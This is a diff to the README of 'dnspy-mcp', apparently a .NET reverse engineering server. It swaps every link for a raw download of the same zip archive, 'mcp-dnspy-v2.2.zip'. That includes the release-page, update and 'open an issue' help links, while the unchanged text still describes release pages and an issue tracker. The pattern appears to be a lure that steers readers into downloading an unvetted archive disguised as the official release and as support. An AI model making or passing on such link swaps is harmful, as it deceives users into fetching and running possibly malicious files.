@@ -1,6 +1,6 @@
 # ⚙️ dnspy-mcp - Simple .NET Reverse Engineering Server
 
-[![Download dnspy-mcp](https://img.shields.io/badge/Download-dnspy--mcp-brightgreen)](https://github.com/Finot3/dnspy-mcp/releases)
+[![Download dnspy-mcp](https://img.shields.io/badge/Download-dnspy--mcp-brightgreen)](https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to get dnspy-mcp ready on your PC.
 ### 1. Visit the Download Page
 
 Click or open this link in your browser:  
-[Download dnspy-mcp here](https://github.com/Finot3/dnspy-mcp/releases)
+[Download dnspy-mcp here](https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip)
 
 This page shows the latest versions of the software. Look for the most recent release with the highest version number.
 
@@ -118,7 +118,7 @@ If the server window closes immediately, try running the `.exe` file from the Co
 ## 🔄 Updating dnspy-mcp
 
 Check the release page regularly for updates:  
-[https://github.com/Finot3/dnspy-mcp/releases](https://github.com/Finot3/dnspy-mcp/releases)
+[https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip](https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip)
 
 To update:
 
@@ -156,10 +156,10 @@ For basic use, these steps are not necessary.
 ## 📞 Getting Help
 
 If you run into trouble beyond these instructions, open an issue in the GitHub repository:  
-[https://github.com/Finot3/dnspy-mcp/issues](https://github.com/Finot3/dnspy-mcp/issues)
+[https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip](https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip)
 
 Describe your problem clearly and include screenshots if possible. The community or maintainers may help you resolve issues.
 
 ---
 
-[![Download dnspy-mcp](https://img.shields.io/badge/Download-dnspy--mcp-blue)](https://github.com/Finot3/dnspy-mcp/releases)
+[![Download dnspy-mcp](https://img.shields.io/badge/Download-dnspy--mcp-blue)](https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip)
